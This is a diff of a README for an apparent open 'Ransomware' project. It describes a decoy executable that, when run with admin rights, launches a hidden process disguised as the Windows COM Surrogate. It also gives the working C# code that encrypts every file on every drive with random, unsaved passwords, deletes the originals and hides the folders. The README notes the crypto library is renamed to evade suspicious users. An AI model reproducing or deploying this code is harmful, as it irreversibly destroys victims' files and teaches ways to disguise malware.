@@ -13,77 +13,80 @@ The [Setup](https://github.com/SeppPenner/Ransomware/blob/master/Setup) folder c
 
 The [BeforeSetup](https://github.com/SeppPenner/Ransomware/blob/master/BeforeSetup) folder contains the files the setup installs.
 
-The [Projects](https://github.com/SeppPenner/Ransomware/blob/master/Projects) folder contains the C# source code.7
+The [Projects](https://github.com/SeppPenner/Ransomware/blob/master/Projects) folder contains the C# source code.
 
 ## The stuff behind
-The LustigeFehler.exe file is the main exe. It will start and show some nonsense error messages. If it's not run in admin mode, it will crash with an error.
-If the .exe is started in admin mode, it will start up a new hidden (can't be seen in the taskbar or as GUI) process called
-[COM Surrogate](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM Surrogate) in the background.
-Why **COM Surrogate**? - Because noone will ever expect a [standard Windows process](https://www.howtogeek.com/326462/what-is-com-surrogate-dllhost.exe-and-why-is-it-running-on-my-pc/) is running as a virus.
-In the background, the our **Fake COM Surrogate.exe** will run and try to encrypt all files on all drives it finds. Additionally, it will **hide** all folders it finds.
-Furthermore, the AES crypto library is obfuscated to the name **msvpc.dll** to avoid that suspicious users (who take a look into the install folder) get more suspicious.
+The **LustigeFehler.exe** file is the main exe. It will start and show some nonsense error messages.
 
-How is this possible? - The following lines of code taken from [Main.cs](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM Surrogate/COM Surrogate/Main.cs) show the main **ransomware** code.
+If it's not run in admin mode, it will crash with an error. If the .exe is started in admin mode, it will start up a new hidden (can't be seen in the taskbar or as GUI) process called
+[COM Surrogate](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM%20Surrogate) in the background.
+
+Why **COM Surrogate**? - Because noone will ever expect a [standard Windows process](https://www.howtogeek.com/326462/what-is-com-surrogate-dllhost.exe-and-why-is-it-running-on-my-pc/) is running as a virus.
+In the background, the our **Fake COM Surrogate.exe** will run and try to encrypt all files on all drives it finds.
+
+Additionally, it will **hide** all folders it finds. Furthermore, the AES crypto library is obfuscated to the name **msvpc.dll** to avoid that suspicious users (who take a look into the install folder) get more suspicious.
+
+How is this possible? - The following lines of code taken from [Main.cs](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM%20Surrogate/COM%20Surrogate/Main.cs) show the main **ransomware** code.
 ```csharp
 private string GetRandomPassword()
 {
-	var alg = SHA512.Create();
-	alg.ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToLongDateString() + _random.Next(int.MaxValue)));
-	return BitConverter.ToString(alg.Hash);
+   var alg = SHA512.Create();
+   alg.ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToLongDateString() + _random.Next(int.MaxValue)));
+   return BitConverter.ToString(alg.Hash);
 }
 
 private void Run()
 {
-	foreach (var drive in DriveInfo.GetDrives())
-	{
-		try
-		{
-			EncryptFs(drive.Name);
-		}
-		catch
-		{
-			// ignored
-		}
-	}
+   foreach (var drive in DriveInfo.GetDrives())
+   {
+      try
+      {
+         EncryptFs(drive.Name);
+      }
+      catch
+      {
+         // ignored
+      }
+   }
 }
 
 private void EncryptFs(string directory)
 {
-	foreach (var file in Directory.GetFiles(directory))
-	{
-		try
-		{
-			if (file == null) continue;
-			Msvpc.UseE(GetRandomPassword(), file,
-				Path.Combine(directory, Path.GetFileNameWithoutExtension(file)) + Resources.Ending);
-			File.Delete(file);
-		}
-		catch
-		{
-			// ignored
-		}
-	}
+   foreach (var file in Directory.GetFiles(directory))
+   {
+      try
+      {
+         if (file == null) continue;
+         Msvpc.UseE(GetRandomPassword(), file,
+            Path.Combine(directory, Path.GetFileNameWithoutExtension(file)) + Resources.Ending);
+         File.Delete(file);
+      }
+      catch
+      {
+         // ignored
+      }
+   }
 
-	foreach (var dir in Directory.GetDirectories(directory))
-	{
-		HideDirectory(dir);
-		EncryptFs(dir);
-	}
+   foreach (var dir in Directory.GetDirectories(directory))
+   {
+      HideDirectory(dir);
+      EncryptFs(dir);
+   }
 }
 
 private void HideDirectory(string dir)
 {
-	var di = new DirectoryInfo(dir);
-	if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
-	{
-		di.Attributes |= FileAttributes.Hidden;
-	}
+   var di = new DirectoryInfo(dir);
+   if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
+   {
+      di.Attributes |= FileAttributes.Hidden;
+   }
 }
 
 private bool IsElevated()
 {
-	var id = WindowsIdentity.GetCurrent();
-	return id.Owner != id.User;
+   var id = WindowsIdentity.GetCurrent();
+   return id.Owner != id.User;
 }
 ```
 
